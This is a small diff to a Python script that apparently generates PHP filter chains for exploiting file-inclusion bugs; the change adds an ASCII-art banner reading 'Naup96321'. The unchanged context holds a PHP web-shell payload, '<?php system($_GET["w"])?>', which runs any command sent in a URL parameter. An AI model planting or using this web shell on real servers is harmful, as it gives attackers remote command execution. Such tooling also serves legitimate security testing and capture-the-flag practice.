@@ -109,6 +109,12 @@ def generate_filter_chain(chain, debug_base64 = False):
 
 shellcode='naup<?php system($_GET["w"])?>naup'.encode('UTF-8')
 s="""
+ _   _                   ___   __  _________  _ 
+| \ | | __ _ _   _ _ __ / _ \ / /_|___ /___ \/ |
+|  \| |/ _` | | | | '_ \ (_) | '_ \ |_ \ __) | |
+| |\  | (_| | |_| | |_) \__, | (_) |__) / __/| |
+|_| \_|\__,_|\__,_| .__/  /_/ \___/____/_____|_|
+                  |_|                           
 Naup96321
 """
 print(Fore.GREEN+s)
